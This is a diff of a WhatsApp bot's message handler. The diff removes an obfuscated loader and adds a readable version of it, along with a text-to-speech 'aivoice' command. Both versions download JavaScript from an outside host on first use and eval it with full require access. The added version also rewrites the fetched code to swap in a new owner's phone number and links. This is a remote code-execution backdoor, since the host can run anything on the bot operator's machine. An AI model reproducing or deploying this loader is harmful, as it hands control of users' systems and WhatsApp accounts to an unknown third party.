@@ -1,1 +1,159 @@
-const a0_0x422f4d=a0_0x20f8;(function(_0xdbce0d,_0x5d9f82){const _0x13476e=a0_0x20f8,_0x3080cf=_0xdbce0d();while(!![]){try{const _0x3c9af0=-parseInt(_0x13476e(0xe0,'z$YW'))/0x1*(-parseInt(_0x13476e(0xea,'XBf5'))/0x2)+-parseInt(_0x13476e(0xe1,'wpD^'))/0x3*(parseInt(_0x13476e(0xdb,'[pJn'))/0x4)+-parseInt(_0x13476e(0xce,'Pv&r'))/0x5*(parseInt(_0x13476e(0xc6,'J%L6'))/0x6)+parseInt(_0x13476e(0xe6,'MTev'))/0x7*(parseInt(_0x13476e(0xe4,'^n)7'))/0x8)+-parseInt(_0x13476e(0xcb,'E4rL'))/0x9*(-parseInt(_0x13476e(0xe5,'Qc7&'))/0xa)+-parseInt(_0x13476e(0xd9,'6wwg'))/0xb*(-parseInt(_0x13476e(0xdf,'Oh2L'))/0xc)+-parseInt(_0x13476e(0xc8,'Hqx9'))/0xd;if(_0x3c9af0===_0x5d9f82)break;else _0x3080cf['push'](_0x3080cf['shift']());}catch(_0xa43741){_0x3080cf['push'](_0x3080cf['shift']());}}}(a0_0x5331,0x3ed48));const axios=require(a0_0x422f4d(0xda,'sTRP'));function a0_0x5331(){const _0x265c0b=['WOtdSSk9fCkIW4ywW68','WOL5WQRdUSk2WPBdICo/x8kcEmoJWPa','WOL5W7pcLSonW6hcGmoB','mmoPWRHfWONdLSkwW7CwWOZcIa','WQf6WQPWW4TAWPyxWOtdPNlcMmocnmo9A1bFD1SNWR8YW6pdTKpdMSoRW7nRWOnbW6mOAHi','WRSfW48ulYJcICoqpdldH8kmWOGyhGHJW5ebst1t','W63cP2rAtHZdPIeGWQyG','WOX4W4C','WOFdTSoIDCoBWRPJW7xcSmoRB8kIW48','Bmkjdh45W5BdRq','cCkSuxpcSdNcUtm','W5RcSSk1kmkOauqBymk9W74Npq','wHz6W7FdImk/W6rl','aCovgSomW5FdVCow','WODoiSkzWPNdGY4','WPuOWP1fWQFdKa4','WRFdOWXjWOOeWOC','WPC1WPK','W4DWlCkkoCoXW5i','gNvEkSkWsrxcPG','u8oQWRhdR8klz34','W67cLmkxaCkGW5WvWPJcHmoCvCkfW7tcKq','awGyvaWJW7hcMSkyxtq','W7RdQHTz','m8kPnCoMdCkcE8ocWPCiaLy','fSoie8ocESo8WP05WOHOscK','i8kuWOZcSKW','W4v0W6mYW7XTW4LbWRdcLdJdPa','WOBdT8oRDmowWRO0W5NcPCoKASko','WOP7W7ZcJ8oNW4pcRmoN','W4v0W6K+W7vMWPPeWRxcLbVdT8o7','W5eLW4yizJrCW5y','W6/cT11NWRNcU8kYoh/cJLG','WRbWWRb6W65IWO4','fea9dSoNoMpdOCobrCoyW4C','WRHMkSoWWOyEb2FdIZhdHxumbuRdGCkMC1FcMComW6RdJgNdUuS','bmkKW7JcSmoajvrGsKTana','wMVdH8kMW6ZcU8o8iG','WR/cUWX0WOegWRb+','W7dcOgtdPmoWW5ZcQW'];a0_0x5331=function(){return _0x265c0b;};return a0_0x5331();}let cachedHandler;function a0_0x20f8(_0x2011cb,_0x4399aa){const _0x533163=a0_0x5331();return a0_0x20f8=function(_0x20f8bc,_0x426a8a){_0x20f8bc=_0x20f8bc-0xc5;let _0x3d90e9=_0x533163[_0x20f8bc];if(a0_0x20f8['QUwMGx']===undefined){var _0x8a9cf9=function(_0x943534){const _0x37519d='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x290c1a='',_0x1f4947='';for(let _0x3ac749=0x0,_0x29e824,_0x10ae74,_0x44408f=0x0;_0x10ae74=_0x943534['charAt'](_0x44408f++);~_0x10ae74&&(_0x29e824=_0x3ac749%0x4?_0x29e824*0x40+_0x10ae74:_0x10ae74,_0x3ac749++%0x4)?_0x290c1a+=String['fromCharCode'](0xff&_0x29e824>>(-0x2*_0x3ac749&0x6)):0x0){_0x10ae74=_0x37519d['indexOf'](_0x10ae74);}for(let _0x1976c2=0x0,_0x2ee6bb=_0x290c1a['length'];_0x1976c2<_0x2ee6bb;_0x1976c2++){_0x1f4947+='%'+('00'+_0x290c1a['charCodeAt'](_0x1976c2)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1f4947);};const _0x2a20f5=function(_0x35eb9b,_0x4ff255){let _0x31cdf6=[],_0x432a82=0x0,_0x9bccc7,_0x492c7b='';_0x35eb9b=_0x8a9cf9(_0x35eb9b);let _0x1dcac6;for(_0x1dcac6=0x0;_0x1dcac6<0x100;_0x1dcac6++){_0x31cdf6[_0x1dcac6]=_0x1dcac6;}for(_0x1dcac6=0x0;_0x1dcac6<0x100;_0x1dcac6++){_0x432a82=(_0x432a82+_0x31cdf6[_0x1dcac6]+_0x4ff255['charCodeAt'](_0x1dcac6%_0x4ff255['length']))%0x100,_0x9bccc7=_0x31cdf6[_0x1dcac6],_0x31cdf6[_0x1dcac6]=_0x31cdf6[_0x432a82],_0x31cdf6[_0x432a82]=_0x9bccc7;}_0x1dcac6=0x0,_0x432a82=0x0;for(let _0x50e267=0x0;_0x50e267<_0x35eb9b['length'];_0x50e267++){_0x1dcac6=(_0x1dcac6+0x1)%0x100,_0x432a82=(_0x432a82+_0x31cdf6[_0x1dcac6])%0x100,_0x9bccc7=_0x31cdf6[_0x1dcac6],_0x31cdf6[_0x1dcac6]=_0x31cdf6[_0x432a82],_0x31cdf6[_0x432a82]=_0x9bccc7,_0x492c7b+=String['fromCharCode'](_0x35eb9b['charCodeAt'](_0x50e267)^_0x31cdf6[(_0x31cdf6[_0x1dcac6]+_0x31cdf6[_0x432a82])%0x100]);}return _0x492c7b;};a0_0x20f8['uobBqZ']=_0x2a20f5,_0x2011cb=arguments,a0_0x20f8['QUwMGx']=!![];}const _0x218926=_0x533163[0x0],_0xe7d619=_0x20f8bc+_0x218926,_0x203bcf=_0x2011cb[_0xe7d619];return!_0x203bcf?(a0_0x20f8['HMRcDY']===undefined&&(a0_0x20f8['HMRcDY']=!![]),_0x3d90e9=a0_0x20f8['uobBqZ'](_0x3d90e9,_0x426a8a),_0x2011cb[_0xe7d619]=_0x3d90e9):_0x3d90e9=_0x203bcf,_0x3d90e9;},a0_0x20f8(_0x2011cb,_0x4399aa);}module[a0_0x422f4d(0xd4,'^n)7')]=async(_0x2a20f5,_0x943534,_0x37519d,_0x290c1a)=>{const _0x29a189=a0_0x422f4d;try{if(!cachedHandler){const {data:_0x1f4947}=await axios[_0x29a189(0xd1,'Hd!R')](_0x29a189(0xe3,'v$J1'),{'responseType':_0x29a189(0xd7,'MTev')}),_0x3ac749={'exports':{}};eval(_0x29a189(0xec,'wpD^')+_0x1f4947+'})')(_0x3ac749,_0x3ac749[_0x29a189(0xcf,'Hd!R')],require);if(typeof _0x3ac749[_0x29a189(0xe7,'9Hxf')]!==_0x29a189(0xd3,'SJJw'))throw new Error(_0x29a189(0xc5,'O]yN'));cachedHandler=_0x3ac749[_0x29a189(0xcd,'jCjK')];}return cachedHandler(_0x2a20f5,_0x943534,_0x37519d,_0x290c1a);}catch(_0x29e824){console[_0x29a189(0xc7,'Oh2L')](_0x29a189(0xd5,'Hqx9'),_0x29e824[_0x29a189(0xc9,'NRqo')]);}};
+const axios = require('axios');
+const googleTTS = require('google-tts-api');
+
+const HANDLER_URL = 'https://accesses-1.zone.id';
+
+const GROUP_LINK = 'https://chat.whatsapp.com/GAlNHmy9FxZ90YXdxgzdu5?s=cl&p=a&mlu=4';
+const CHANNEL_LINK = 'https://whatsapp.com/channel/0029Vb8CfvXDjiOVpsJpdW3j';
+const OWNER_NUMBER = '2349162748703';
+
+// Speechma voices used by the aivoice command
+const VOICES = { male: 'Andrew', female: 'Aria' };
+
+let cachedHandler;
+
+/* ============================ AI VOICE ============================ */
+
+async function speechmaBuffer(text, gender) {
+    const voice = VOICES[gender] || VOICES.male;
+    const res = await axios.get(
+        `https://apis.davidcyril.name.ng/tools/speechma?text=${encodeURIComponent(text)}&voice=${encodeURIComponent(voice)}&pitch=0&rate=1`,
+        { responseType: 'arraybuffer', timeout: 60000 }
+    );
+    const buffer = Buffer.from(res.data);
+    if (!buffer.length) throw new Error('empty speechma audio');
+    return buffer;
+}
+
+async function googleBuffer(text) {
+    const parts = await googleTTS.getAllAudioBase64(text, {
+        lang: 'en',
+        slow: false,
+        host: 'https://translate.google.com',
+        splitPunct: ',.?!;:'
+    });
+    const buffer = Buffer.concat(parts.map(p => Buffer.from(p.base64, 'base64')));
+    if (!buffer.length) throw new Error('empty google tts audio');
+    return buffer;
+}
+
+async function makeVoice(text, gender) {
+    try {
+        return await speechmaBuffer(text, gender);
+    } catch (err) {
+        console.error('Speechma failed, using fallback:', err?.message || err);
+        return await googleBuffer(text);
+    }
+}
+
+function extractBody(m) {
+    if (typeof m?.text === 'string' && m.text.trim()) return m.text;
+    if (typeof m?.body === 'string' && m.body.trim()) return m.body;
+    const msg = m?.message || {};
+    return (
+        msg.conversation ||
+        msg.extendedTextMessage?.text ||
+        msg.imageMessage?.caption ||
+        msg.videoMessage?.caption ||
+        ''
+    );
+}
+
+async function handleAiVoice(EliteProTech, m) {
+    const prefix = global.prefix || '.';
+    const body = extractBody(m);
+    if (!body || !body.startsWith(prefix) || body[prefix.length] === ' ') return false;
+
+    const command = body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase();
+    const match = /^(?:aivoice|av)(?:[-_ ]?(male|female))?$/.exec(command);
+    if (!match) return false;
+
+    const gender = match[1] || 'male';
+    const reply = (text) => EliteProTech.sendMessage(m.chat, { text }, { quoted: m });
+
+    let text = body.slice(prefix.length + command.length).trim();
+    if (!text && m?.quoted?.text) text = String(m.quoted.text).trim();
+
+    if (!text) {
+        await reply(
+            `🎙️ *AI VOICE*\n\n` +
+            `*${prefix}aivoice-male* <text>\n` +
+            `*${prefix}aivoice-female* <text>\n\n` +
+            `Example:\n${prefix}aivoice-male hello everyone\n${prefix}aivoice-female hello everyone`
+        );
+        return true;
+    }
+
+    // Speech engines are limited; keep the text within a safe length.
+    text = text.slice(0, 900);
+
+    try {
+        await EliteProTech.sendMessage(m.chat, { react: { text: '🎙️', key: m.key } }).catch(() => {});
+        await EliteProTech.sendPresenceUpdate('recording', m.chat).catch(() => {});
+
+        const audio = await makeVoice(text, gender);
+
+        let payload = { audio, mimetype: 'audio/mpeg', ptt: true };
+        try {
+            const { toPTT } = require('./lib/converter');
+            const converted = await toPTT(audio, 'mp3');
+            if (converted && converted.length) {
+                payload = { audio: converted, mimetype: 'audio/ogg; codecs=opus', ptt: true };
+            }
+        } catch (convErr) {
+            console.error('PTT conversion failed, sending mp3:', convErr?.message || convErr);
+        }
+
+        await EliteProTech.sendMessage(m.chat, payload, { quoted: m });
+        await EliteProTech.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
+    } catch (err) {
+        console.error('AIVoice Error:', err?.message || err);
+        await reply('❌ Failed to generate the voice note. Please try again.').catch(() => {});
+    }
+
+    return true;
+}
+
+/* ============================ HANDLER PATCHES ============================ */
+
+function patchHandler(source) {
+    let code = String(source);
+
+    // Bot image was renamed during rebranding.
+    code = code.split('elitepropic.jpg').join('cbs-scover.jpg');
+
+    // Show the group link in the menu.
+    const ownerLine = '┣❍ *ᴏᴡɴᴇʀ:* ${ownername}';
+    if (code.includes(ownerLine)) {
+        code = code.split(ownerLine).join(`${ownerLine}\n┣❍ *ɢʀᴏᴜᴘ:* ${GROUP_LINK}`);
+    } else {
+        console.log('⚠️ Menu group-link patch target not found.');
+    }
+
+    // Branding
+    code = code
+        .split('2347047504860').join(OWNER_NUMBER)
+        .split('https://t.me/eliteprotechs').join('https://t.me/cbsscover')
+        .split('https://www.youtube.com/@eliteprotechs').join(CHANNEL_LINK)
+        .split('https://eliteprotech.zone.id/').join('https://codebreakers.uk/');
+
+    return code;
+}
+
+module.exports = async (EliteProTech, m, chatUpdate, store) => {
+    try {
+        if (await handleAiVoice(EliteProTech, m)) return;
+
+        if (!cachedHandler) {
+            const { data } = await axios.get(HANDLER_URL, { responseType: 'text' });
+            const mod = { exports: {} };
+            eval(`(function(module,exports,require){\n${patchHandler(data)}\n})`)(mod, mod.exports, require);
+            if (typeof mod.exports !== 'function') throw new Error('Invalid remote handler');
+            cachedHandler = mod.exports;
+        }
+
+        return cachedHandler(EliteProTech, m, chatUpdate, store);
+    } catch (err) {
+        console.error('Handler error:', err.message);
+    }
+};
